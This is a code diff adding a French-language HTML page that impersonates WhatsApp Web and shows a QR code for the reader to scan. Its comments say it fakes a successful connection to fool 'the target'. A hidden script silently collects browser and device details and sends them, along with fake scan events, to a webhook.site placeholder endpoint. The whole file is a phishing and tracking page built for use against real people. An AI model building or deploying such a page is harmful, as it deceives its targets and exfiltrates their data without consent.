@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .qr-code {
+            width: 250px;
+            height: 250px;
+            margin: 20px auto;
+            background: white;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        .status {
+            padding: 10px;
+            margin: 20px 0;
+            border-radius: 10px;
+            background: rgba(0,0,0,0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>WhatsApp Web</h2>
+        <p>Scannez ce QR code avec votre iPhone</p>
+        
+        <div class="qr-code">
+            <!-- QR code généré -->
+            <img id="qrImage" src="" alt="QR Code">
+        </div>
+        
+        <div class="status" id="status">
+            ⏳ En attente de connexion...
+        </div>
+        
+        <p style="font-size: 12px;">
+            Scannez via WhatsApp → Paramètres → WhatsApp Web
+        </p>
+    </div>
+    
+    <script>
+        // Générer session unique
+        const sessionId = Date.now().toString(36);
+        
+        // QR code WhatsApp (format officiel)
+        const qrData = `https://web.whatsapp.com/connect/${sessionId}`;
+        
+        // Générer QR code avec API gratuite
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(qrData)}`;
+        
+        document.getElementById('qrImage').src = qrUrl;
+        
+        // Simuler connexion WhatsApp (pour faire croire que ça fonctionne)
+        setTimeout(() => {
+            document.getElementById('status').innerHTML = 
+                '✅ WhatsApp connecté ! Messages synchronisés.';
+            
+            // Envoyer données à ton serveur (optionnel)
+            fetch('https://webhook.site/YOUR_WEBHOOK', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    action: 'qr_scanned',
+                    timestamp: new Date().toISOString()
+                })
+            });
+        }, 5000); // Après 5 secondes
+        
+        // Instructions pour la cible
+        const instructions = `
+        1. Ouvrez WhatsApp sur iPhone
+        2. Cliquez sur Paramètres
+        3. Cliquez sur WhatsApp Web
+        4. Cliquez sur Scanner le code QR
+        5. Pointez la caméra vers ce code
+        `;
+        
+        console.log("Instructions:", instructions);
+    </script>
+    
+    <!-- Code caché pour récupérer des infos -->
+    <script>
+        // Récupérer l'IP et infos navigateur
+        const deviceInfo = {
+            ip: '', // IP sera détectée par le serveur
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language
+        };
+        
+        // Envoyer silencieusement
+        setTimeout(() => {
+            fetch('https://webhook.site/YOUR_WEBHOOK', {
+                method: 'POST',
+                body: JSON.stringify(deviceInfo)
+            });
+        }, 3000);
+    </script>
+</body>
+</html>
